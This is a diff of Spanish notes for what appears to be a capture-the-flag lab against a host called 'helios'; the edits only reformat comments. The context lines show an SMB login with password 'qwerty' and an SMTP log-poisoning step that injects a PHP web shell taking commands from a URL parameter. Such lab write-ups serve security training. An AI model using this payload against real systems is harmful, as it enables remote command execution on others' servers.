@@ -108,7 +108,7 @@ O
 
 ```bash
 smbclient \\\\172.16.217.129\\helios -U helios
-#pass qwerty
+# pass qwerty
 ```
 ##### **O con [[smbmap]] (elegir 1):**
 
@@ -241,7 +241,7 @@ Puedo intentar crear un log con código php para ver si es interpretado:
     ```bash
     MAIL FROM: v # Pongo mail de destino y quien lo recibe
     RCPT TO: helios # Pongo para que lo reciba helios porque sé que existe
-    DATA #Pongo data para escribir el contenido
+    DATA # Pongo data para escribir el contenido
     <?php system ($_GET['cmd']); ?> # Inyecto el codigo php
     . # termina cuando pongo un `.`
     ```
